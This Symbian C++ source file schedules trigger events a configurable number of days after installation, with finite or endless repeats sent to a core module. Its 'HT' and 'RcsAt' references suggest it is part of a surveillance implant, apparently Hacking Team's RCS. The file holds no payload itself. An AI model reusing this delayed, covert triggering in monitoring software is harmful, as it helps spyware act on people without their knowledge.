/*
 * EventAfterInstall.cpp
 *
 *  Created on: 11/mag/2012
 *      Author: Giovanna
 */

#include "EventAfterInstall.h"

#include "Json.h"
#include <HT\LogFile.h>


CEventAfterInstall::CEventAfterInstall(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_AfterInstall, aTriggerId)
	{
	// No implementation required
	}

CEventAfterInstall::~CEventAfterInstall()
	{
	__FLOG(_L("Destructor"));
	delete iTimer;
	//delete iTimerTo;
	delete iTimerRepeat;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CEventAfterInstall* CEventAfterInstall::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventAfterInstall* self = new (ELeave) CEventAfterInstall(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventAfterInstall* CEventAfterInstall::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventAfterInstall* self = CEventAfterInstall::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}
 
void CEventAfterInstall::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventAfterInstall.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	
	RBuf paramsBuf;
			
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
			
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			rootObject->GetIntL(_L("end"),iAfterInstallParams.iExitAction);
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			//action
			rootObject->GetIntL(_L("repeat"),iAfterInstallParams.iRepeatAction);
			//iter
			if(rootObject->Find(_L("iter")) != KErrNotFound)
				rootObject->GetIntL(_L("iter"),iAfterInstallParams.iIter);
			//delay
			if(rootObject->Find(_L("delay")) != KErrNotFound)
				{
				rootObject->GetIntL(_L("delay"),iAfterInstallParams.iDelay);
				if(iAfterInstallParams.iDelay == 0)
					iAfterInstallParams.iDelay = 1;
				}
			}
		//retrieve days
		if(rootObject->Find(_L("days")) != KErrNotFound)
			{			
			rootObject->GetIntL(_L("days"),iAfterInstallParams.iDays);
			}
		//retrieve enable flag
		rootObject->GetBoolL(_L("enabled"),iEnabled);
				
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	
	iTimer = CTimeOutTimer::NewL(*this);
	
	
	if((iAfterInstallParams.iRepeatAction != -1) && (iAfterInstallParams.iDelay != -1))
		{
		iTimerRepeat = CTimeOutTimer::NewL(*this);
		iSecondsIntervRepeat = iAfterInstallParams.iDelay;
		}
	else
		iTimerRepeat = NULL;
	
	}

void CEventAfterInstall::StartEventL()
	{
	__FLOG(_L("StartEventL"));
	__FLOG_2(_L("%d %d"), iTimerType, iSecondsInterv.Int()); 
	
	iEnabled = ETrue;
	
	RFs fs;
	fs.Connect();
	CLogFile* markupFile = CLogFile::NewLC(fs);
	
	TInt64 timestamp;
	if(markupFile->ExistsMarkupL(Type()))
		{
		// retrieve iTimestamp
		RBuf8 timeBuffer(markupFile->ReadMarkupL(Type()));
		timeBuffer.CleanupClosePushL();
		Mem::Copy(&timestamp,timeBuffer.Ptr(),sizeof(timestamp));
		CleanupStack::PopAndDestroy(&timeBuffer);		
		}
	CleanupStack::PopAndDestroy(markupFile);
	fs.Close();
	
	TTime time(timestamp);  //timestamp has been saved as Universal Time
	time += (TTimeIntervalDays) iAfterInstallParams.iDays;
	
	//TODO: delete when done
	/*
	TBuf<30> dateString;
	// day
	_LIT(KDateString1,"%E%D%X%N%Y %1 %2 %3");
	time.FormatL(dateString,KDateString1);
	// hour
	_LIT(KDateString4,"%-B%:0%J%:1%T%:2%S%.%*C4%:3%+B");
	time.FormatL(dateString,KDateString4);
	*/
	//TODO: end delete
	
	TTime now;
	now.UniversalTime();
	
	if(now > time)
		{
		// date expired, trigger start action immediately
		TTimeIntervalSeconds secondsInterv = 1;
		iTimeAt.HomeTime();
		iTimeAt += secondsInterv;
		iTimer->RcsAt(iTimeAt);
		}
	else
		{
		iTimeAt = time;
		iTimer->RcsAt(iTimeAt);
		}
	
	}

void CEventAfterInstall::StopEventL()
	{
	iTimer->Cancel();
	if(iTimerRepeat != NULL)
		iTimerRepeat->Cancel();
	iEnabled = EFalse;
	}


void CEventAfterInstall::TimerExpiredL(TAny* src)
	{
	__FLOG(_L("TimerExpiredL"));
	if(src == iTimer)
		{
		// trigger start action 
		SendActionTriggerToCoreL();
		// start repeat action
		if((iAfterInstallParams.iRepeatAction != -1) && (iAfterInstallParams.iDelay != -1))
			{
			iSteps = iAfterInstallParams.iIter;
					
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->RcsAt(iTimeAtRepeat);
			}
		return;	
		}
	
	if(src == iTimerRepeat)
		{
		if(iAfterInstallParams.iIter == -1)
			{
			// infinite loop
			// restart timer
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->RcsAt(iTimeAtRepeat);
			SendActionTriggerToCoreL(iAfterInstallParams.iRepeatAction);
			}
		else
			{
			// finite loop
			if(iSteps > 0)
				{
				// still something to do
				// restart timer
				iTimeAtRepeat.HomeTime();
				iTimeAtRepeat += iSecondsIntervRepeat;
				iTimerRepeat->RcsAt(iTimeAtRepeat);
				--iSteps;
				SendActionTriggerToCoreL(iAfterInstallParams.iRepeatAction);
				}
			}
		}
	}
